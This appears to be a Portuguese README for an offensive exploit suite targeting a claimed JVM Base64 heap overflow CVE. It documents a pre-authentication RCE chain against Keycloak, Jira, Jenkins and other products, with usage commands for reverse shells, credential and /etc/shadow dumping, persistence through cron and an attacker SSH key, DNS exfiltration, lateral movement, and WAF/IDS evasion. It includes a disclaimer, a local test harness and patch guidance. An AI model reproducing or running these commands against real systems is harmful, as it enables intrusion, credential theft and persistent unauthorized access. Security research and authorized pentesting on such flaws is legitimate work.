<p align="right">
  <a href="README.md"><b>English</b></a> •
  <a href="README.pt-BR.md"><b>Português (Brasil)</b></a>
</p>

<p align="center">
  <a href="README.md"><img src="https://img.shields.io/badge/Language-English-blue?style=for-the-badge" alt="English"></a>
  <a href="README.pt-BR.md"><img src="https://img.shields.io/badge/Language-Português-green?style=for-the-badge" alt="Português"></a>
</p>

# Java4Shell — CVE-2026-114938 — Full Exploit Suite

> **Finalidade ética:** Esta ferramenta foi desenvolvida exclusivamente para pentest autorizado,
> red team e estudo de segurança ofensiva. Use apenas em sistemas para os quais você possui
> autorização explícita por escrito. O uso não autorizado é ilegal.

---

## Referências e fontes

| Fonte | Link |
|-------|------|
| Descoberta original | [calif.io/java4shell](https://calif.io/java4shell/) |
| PoC de referência | [github.com/scadastrangelove/java4shell](https://github.com/scadastrangelove/java4shell/tree/main) |
| NVD | [CVE-2026-114938](https://nvd.nist.gov/vuln/detail/CVE-2026-114938) |
| Tenable | [Plugin Java4Shell](https://www.tenable.com) |
| SecurityOnline | [cve-watchtower/cve-2026-114938](https://securityonline.info/cve-watchtower/cve-2026-114938/) |

---

## O que é o Java4Shell

**CVE-2026-114938** — heap out-of-bounds write no decoder Base64 otimizado via instrinsic
AVX-512 VBMI do HotSpot JVM. Descoberto e publicado pela Calif.io em novembro de 2026.

| Item | Detalhe |
|------|---------|
| CVSS v4.0 | **9.2 Critical** |
| CVSS v3.1 | 8.1 High |
| CWE | CWE-122 (Heap Buffer Overflow) |
| Componente | `java.util.Base64` (instrinsic AVX-512 VBMI no HotSpot JVM) |
| Impacto | Memory leak ("JavaBleed") + RCE pré-autenticação |
| JDK afetados | 17.0.6+, 21.x, 25.x, 27.x (não patchados) |
| CPU afetadas | x86-64 com AVX-512 VBMI (Intel/AMD) — ARM64 **imune** |
| Descoberto por | [Calif.io](https://calif.io/java4shell/) |

### Como funciona

O intrinsic AVX-512 VBMI calcula o tamanho do buffer de saída como:

```
out_len = (in_len * 3 / 4) - trailing_padding_count
```

Com um bloco alinhado a 64 bytes (lane boundary do AVX-512) + caracteres `=` extras
mal posicionados, o cálculo sofre **integer underflow** → valor negativo interpretado
como full-width store mask → escrita de ~62–63 bytes além do buffer no heap Java
(**heap out-of-bounds write**).

### Cadeia de exploração completa

```
OOB Write (CVE-2026-114938)
        ↓
    Heap Grooming         → posiciona byte[] adjacente ao buffer corrompido
        ↓
    Type Confusion         → corrompe campo `length` do array adjacente
        ↓
    Arbitrary R/W          → array over-length → leitura/escrita arbitrária no heap
        ↓
    Post-Exploitation      → cmd | shell | bleed | persist | filerd | creds
                             privesc | dns_oob | screenshot | ssrf | lateral
```

---

## Produtos afetados

### RCE pré-autenticação confirmado
| Produto | Endpoint principal |
|---------|-------------------|
| Keycloak | SAML SSO endpoint |
| Atlassian Jira | REST API Basic Auth |
| Atlassian Confluence | SAML plugin + REST |
| Jenkins | API Basic Auth + Groovy console |
| JFrog Artifactory | API Basic Auth |
| PingFederate | SAML POST binding |

### RCE pós-autenticação
| Produto | Vetor |
|---------|-------|
| Apache Kafka (REST Proxy) | JSON body |
| Apache Solr | Admin API |
| Elasticsearch | Bulk API |
| Gerrit | REST API /a/ prefix |
| Spinnaker | Gate API |

---

## Estrutura da ferramenta

```
java4shell/
├── java4shell_scanner.py        # Detecção rápida (sem exploração)
├── java4shell_exploit.py        # Suite completa de exploração
├── java4shell_mass_scan.py      # Mass scan via lista de alvos
├── selftest.py                  # Auto-validação sem dependências externas
├── mock_vulnapp.py              # Mock server Python (testes sem Docker/JDK)
├── smoke_oob_test.py            # Smoke test de integração: OOB end-to-end
├── docker-compose.yml           # Ambiente de teste Docker (VulnApp + Keycloak + Jenkins)
└── modules/
    ├── targets.py               # Perfis de alvo (13 aplicações, inclui vulnapp)
    ├── fingerprint.py           # Fingerprint de JDK, GC, AVX-512 VBMI, aplicação
    ├── heap_oracle.py           # Análise de layout do heap
    ├── grooming.py              # Heap grooming/spray (G1GC, ZGC, Shenandoah)
    ├── exploit_core.py          # OOB write + scalar fallback + type confusion + arb R/W
    ├── calibrate.py             # Varredura de offsets de payload e calibração (--mode calibrate)
    ├── http_utils.py            # Rotação de User-Agent (16 pools) e jitter adaptativo
    ├── report.py                # Geração de relatórios Markdown e JUnit XML
    └── post/
        ├── cmd_exec.py          # Execução de comando OS (SpEL, OGNL, Groovy)
        ├── reverse_shell.py     # Reverse shell (bash, python, nc, java, PS)
        ├── javableed.py         # Dump de memória heap + extração de credenciais
        ├── persistence.py       # Persistência (cron, systemd, registry, etc.)
        ├── file_read.py         # Leitura de arquivos arbitrários
        ├── cred_dump.py         # Dump completo de credenciais
        ├── privesc.py           # Descoberta de privesc (SUID, sudo, capabilities, kernel)
        ├── dns_oob.py           # DNS Out-of-Band exfiltration + UDP listener
        ├── screenshot.py        # Captura de tela via java.awt.Robot / ferramentas nativas
        ├── ssrf_scan.py         # Pivot de rede interna via SSRF + cloud metadata
        └── lateral.py           # Movimentação lateral (SSH, Redis, Docker, DB probes)
```

---

## Requisitos

- Python **3.10+**
- Sem dependências externas — stdlib pura (`urllib`, `ssl`, `concurrent.futures`, `socket`)

---

## Scanner de detecção (sem exploração)

### Alvo único

```bash
python java4shell_scanner.py https://jira.cliente.com
```

### Múltiplos alvos

```bash
python java4shell_scanner.py https://jira.com https://keycloak.com https://jenkins.com
```

### Com relatório JSON e verbose

```bash
python java4shell_scanner.py https://target.com --output report.json --verbose
```

### Com evasão de WAF (jitter entre probes)

```bash
# Delay aleatório 0–300ms entre cada probe — mistura com tráfego legítimo
python java4shell_scanner.py https://target.com --jitter 300
```

### Mass scan (lista de alvos)

```bash
python java4shell_mass_scan.py targets.txt --target-threads 20 --output mass_report.json
```

---

## Suite de exploração completa

### Sintaxe

```
python java4shell_exploit.py <TARGET_URL> [-O <OBJETIVO>] [--mode {exploit,calibrate}] [opções]
```

> **Nota:** Com `--mode calibrate`, o argumento `-O` não é obrigatório.

### Objetivos de pós-exploração (`-O`)

| Objetivo | Descrição | Flags obrigatórias |
|----------|-----------|-------------------|
| `cmd` | Executa um comando OS | `--command` |
| `shell` | Drop de reverse shell | `--lhost` `--lport` |
| `bleed` | JavaBleed: dump de heap + extração de credenciais | — |
| `persist` | Instala mecanismos de persistência | `--lhost` `--lport` |
| `filerd` | Leitura de arquivos arbitrários do filesystem | — |
| `creds` | Dump completo de credenciais (env, config, JVM props) | — |
| `privesc` | Descoberta de SUID, sudo, capabilities e kernel vulns | — |
| `dns_oob` | Beacon DNS out-of-band + exfiltração de atributos | `--oob-domain` |
| `screenshot` | Captura de display via java.awt.Robot | — |
| `ssrf` | Pivot de rede interna + enumeração de metadata cloud | — |
| `lateral` | Movimentação lateral: SSH, Redis, Docker, DB probes | — |
| `all` | Todos os objetivos em sequência (7 fases) | — |

---

## Exemplos de uso

### Calibração de offset por build (`--mode calibrate`)

Varre 64 tamanhos de payload Base64 (3B a 192B) em 3 variantes de padding anômalo para mapear o offset do OOB write antes do exploit:

```bash
# Varredura completa com recomendações de spray e offset
python java4shell_exploit.py http://localhost:8088 --profile vulnapp --mode calibrate --verbose

# Redirecionar resumo JSON estruturado para análise
python java4shell_exploit.py http://localhost:8088 --profile vulnapp --mode calibrate 2>calibration.json
```

### Dump de credenciais em Keycloak (auto-detect)

```bash
python java4shell_exploit.py https://keycloak.cliente.com -O creds
```

### Reverse shell com listener integrado em Jenkins

```bash
python java4shell_exploit.py https://jenkins.cliente.com -O shell \
  --lhost 10.10.14.5 --lport 4444 --listen --profile jenkins
```

### Executar comando específico (Jira, forçar JDK 17 + G1GC)

```bash
python java4shell_exploit.py https://jira.cliente.com -O cmd \
  --command "id && hostname && cat /etc/passwd" \
  --jdk-version 17 --gc G1GC
```

### JavaBleed — dump de memória heap

```bash
python java4shell_exploit.py https://target.com -O bleed \
  --dump-rounds 20 --dump-output heap_dump.txt
```

### Persistência (cron + authorized_keys)

```bash
python java4shell_exploit.py https://target.com -O persist \
  --lhost 10.10.14.5 --lport 4444 \
  --mechanisms cron authorized_keys \
  --ssh-pubkey "ssh-rsa AAAA...  attacker@kali"
```

### Leitura de arquivos específicos com dump em diretório

```bash
python java4shell_exploit.py https://target.com -O filerd \
  --files /etc/passwd /root/.ssh/id_rsa /etc/shadow \
  --output-dir ./loot
```

### Full chain com relatório JSON

```bash
python java4shell_exploit.py https://target.com -O all \
  --lhost 10.10.14.5 --lport 4444 \
  --output exploitation_report.json \
  --verbose
```

### Privesc discovery

```bash
python3 java4shell_exploit.py https://target.com -O privesc --profile keycloak
```

### DNS Out-of-Band beacon (exfiltração)

```bash
python3 java4shell_exploit.py https://target.com -O dns_oob \
  --oob-domain <token>.burpcollaborator.net \
  --listen-port 1053
```

### SSRF — pivot de rede interna

```bash
python3 java4shell_exploit.py https://target.com -O ssrf --profile spring
```

### Movimentação lateral (SSH + Redis + Docker)

```bash
python3 java4shell_exploit.py https://target.com -O lateral \
  --lateral-creds admin:senha123 root:toor \
  --ssh-key /home/kali/.ssh/id_rsa
```

---

## Ambiente de teste local (Docker)

> Requer Docker Engine ≥ 24.0 com Compose v2. Imagem `eclipse-temurin:21-jdk` (~477MB).

```bash
cd /home/kali/Documents/java4shell

# Subir o VulnApp (porta 8088 — evita conflito com outros containers em 8080)
docker compose up -d vuln-app

# Acompanhar startup (javac + JVM boot ~15s)
docker compose logs -f vuln-app
# Aguardar: [VulnApp] Listening on :8080

# Verificar saúde
curl http://localhost:8088/health
# → {"status":"UP"}

# Testar o decode-error signal manualmente
curl -s -X POST http://localhost:8088/api/decode \
  -H "Content-Type: application/json" \
  -d '{"data":"QUFBQUFBQUFB="}' | python3 -m json.tool
# → {"result": "[decode error: Input byte array has wrong 4-byte ending unit]"}

# Calibração prévia
python3 java4shell_exploit.py http://localhost:8088 --profile vulnapp --mode calibrate --verbose

# Scanner
python3 java4shell_scanner.py http://localhost:8088

# Exploit (host sem AVX-512 VBMI: abort após type_confusion=False, comportamento esperado)
python3 java4shell_exploit.py http://localhost:8088 \
  --profile vulnapp -O creds --warmup 50

# Teardown
docker compose down
```

> **Nota sobre hosts sem AVX-512 VBMI:** o exploit confirma `oob_triggered=YES`
> via decode-error signal, mas aborta antes do post-ex pois `type_confusion=False`.
> Em CPU com AVX-512 VBMI (Intel Skylake-X+, Ice Lake+, AMD Zen 4+) o heap write
> físico ocorre e `type_confusion=YES`, liberando post-exploitation completo.

---

## Perfis de alvo suportados

| `--profile` | Aplicação | RCE |
|-------------|-----------|-----|
| `keycloak` | Keycloak IAM | pré-auth |
| `jira` | Atlassian Jira | pré-auth |
| `confluence` | Atlassian Confluence | pré-auth |
| `jenkins` | Jenkins CI/CD | pré-auth |
| `artifactory` | JFrog Artifactory | pré-auth |
| `pingfederate` | PingFederate SSO | pré-auth |
| `kafka` | Apache Kafka REST Proxy | pós-auth |
| `solr` | Apache Solr | pós-auth |
| `elasticsearch` | Elasticsearch | pós-auth |
| `gerrit` | Gerrit Code Review | pós-auth |
| `spring` | Spring Boot (genérico) | pré-auth |
| `spinnaker` | Spinnaker CD | pós-auth |
| `vulnapp` | VulnApp (harness de teste local) | pré-auth |

> Sem `--profile`: detecção automática via fingerprint de headers e body.

---

## Opções de tuning do exploit

| Flag | Padrão | Descrição |
|------|--------|-----------|
| `--mode` | `exploit` | `exploit`: cadeia completa + pós-ex; `calibrate`: varredura de offset e payload ideal |
| `--jdk-version` | auto | Forçar versão JDK (17, 21, 25, 27) |
| `--gc` | auto | Forçar GC (G1GC, ZGC, Shenandoah, ParallelGC) |
| `--attempts` | 5 | Tentativas máximas do exploit core |
| `--groom-threads` | 20 | Threads do spray de grooming |
| `--skip-groom` | — | Pular grooming (mais rápido, menor taxa de sucesso) |
| `--skip-oracle` | — | Pular heap oracle |
| `--warmup N` | 0 | Requisições de warmup JIT antes do trigger (recomendado: 50–500 sem AVX-512 VBMI) |
| `--jitter MAX_MS` | 0 | Delay aleatório 0–MAX_MS ms entre requests para evasão de WAF/IDS |
| `--timeout` | 15s | Timeout de requisição HTTP |

---

## Fases do exploit

### Fase 1 — Fingerprint
Detecta: aplicação, versão do JDK, GC em uso, presença de AVX-512 VBMI no host (`/proc/cpuinfo`),
tamanho de região do GC, layout do header de objeto. Se VBMI estiver ausente, ativa automaticamente
o **scalar fallback trigger** (padding anômalo de 3 bytes por chunk).

### Fase 2 — Heap Oracle
Envia requisições de tamanhos variados para mapear o layout do heap.
Detecta boundaries de regiões do GC via timing, e tenta expor metadados
do heap em mensagens de erro.

### Fase 3 — Heap Grooming
Spray de objetos `byte[]` de tamanho controlado para posicionar um array
adjacente ao buffer que sofrerá o OOB write. Estratégia adaptada por GC:
- **G1GC**: fill de Eden region + fine positioning
- **ZGC**: fill de small page (2MB)
- **Shenandoah**: fill de region (256KB)

### Fase 3.5 — JIT Warmup (opcional, `--warmup N`)
Envia N requisições benignas antes do trigger para garantir que o método
`Base64.Decoder.decode0()` seja compilado pelo JIT (C2 compiler). Sem warmup,
a JVM pode executar o método ainda no modo interpretado, o que não ativa o
intrinsic AVX-512 e reduz a probabilidade de type confusion.

### Fase 4 — OOB Write / Type Confusion
Dispara o payload malformado. Verifica type confusion pelo campo `length`
corrompido. Tenta até `--attempts` vezes com re-grooming entre tentativas.

> **Gate de segurança:** se `oob_triggered=False`, o exploit aborta com diagnóstico.
> Se `oob_triggered=True` mas `type_confusion=False` (esperado em hosts sem AVX-512 VBMI),
> o exploit também aborta — post-exploitation requer heap R/W confirmado.

### Post-Ex
Objetivos executados via SpEL, OGNL, Groovy console, ou Runtime.exec
dependendo da aplicação alvo detectada. Só é alcançado com `type_confusion=True`.

---

## Mecanismos de persistência

| Mecanismo | Sistema | Privilégio |
|-----------|---------|------------|
| `cron` | Linux | root (cron.d) ou user crontab |
| `systemd` | Linux | user (sem root) |
| `bashrc` | Linux | user (sem root) |
| `rc_local` | Linux | root |
| `authorized_keys` | Linux | user (sem root) |
| `schtasks` | Windows | user/admin |

---

## Lógica dos payloads de detecção

Superfícies testadas pelo scanner:

| Superfície | Descrição |
|-----------|-----------|
| `HTTP-Basic-Auth` | `Authorization: Basic <payload>` |
| `Bearer-Token` | `Authorization: Bearer <payload>` |
| `Multipart-Upload` | MIME multipart body |
| `JSON-Body` | Campo `data` em POST JSON |
| `SAML-SSO` | Parâmetro `SAMLRequest` |
| `Query-Param` | `?data=<payload>` |

Sinais de vulnerabilidade:

| Sinal | Confiança |
|-------|-----------|
| Connection reset / RemoteDisconnected | **Alta** — crash do JVM |
| `hs_err_pid`, `SIGSEGV`, `Exception in thread` | **Alta** |
| HTTP 500 com stack trace | **Média** |
| `{"result":"[decode error: ...]"}` no body JSON | **Média** — padding processado antes da exceção |
| Latência 5× acima do baseline (mín. 40ms abs.) | **Baixa** — heap stall por OOB write |
| Body vazio em status < 400 | **Baixa** |

---

## Mitigações (para reportar ao cliente)

### Correção definitiva
Atualizar o JDK para versões patchadas (Oracle Critical Patch Update, nov/2026):

| JDK | Versão patchada |
|-----|-----------------|
| 17 | `17.0.21.1+` |
| 21 | `21.0.13.1+` |
| 25 | `25.0.5.1+` |
| 27 | `27.0.1.1+` |

### Workaround temporário (x86-64 apenas)

Desabilitar o intrinsic Base64:
```
-XX:-UseBASE64Intrinsics
```

Ou forçar AVX2 máximo (impede AVX-512 VBMI):
```
-XX:UseAVX=2
```

> ⚠️ **Não** aplicar `-XX:UseAVX=2` em hosts ARM64 — a JVM não reconhece a flag e falha ao iniciar.

### WAF / controles de rede
Cloudflare, Azure WAF e outros já publicaram regras para padrões Base64 malformados.
WAFs são defesa em profundidade — não substituem o patch do JDK.

**Evasão disponível na suite:**
- `--jitter MAX_MS` — delay aleatório entre requisições (scanner e exploit)
- User-Agent rotacionado automaticamente em toda requisição (16 UAs reais: Chrome, Firefox, Safari, Edge, curl, Java, okhttp, Apache, RESTEasy, python-requests) — sem necessidade de flag adicional
